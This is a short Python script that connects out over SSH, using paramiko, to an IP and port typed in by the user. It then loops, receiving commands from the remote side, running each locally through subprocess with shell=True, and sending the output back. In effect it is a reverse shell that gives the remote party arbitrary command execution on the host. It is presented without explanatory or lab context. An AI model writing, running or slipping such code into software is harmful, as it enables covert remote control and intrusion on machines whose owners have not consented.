import paramiko
import subprocess
import shlex
import getpass

def ssh_client(ip, port, username, password, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port, username, password)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

        while True:
            command = ssh_session.recv(1024)

            try:
                cmd = command.decode()
                if cmd == "exit":
                    client.close()
                    break
                output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(output or 'okey')
            except Exception as e:
                ssh_session.send(str(e))   
        client.close()
    return

def main():
    username = getpass.getuser()
    password = getpass.getpass()
    ip = input("IP: ")
    port = input("Port: ")
    cmd = 'ClientConnected'

    ssh_client(ip, port, username, password, cmd)

if __name__ == "__main__":
    main()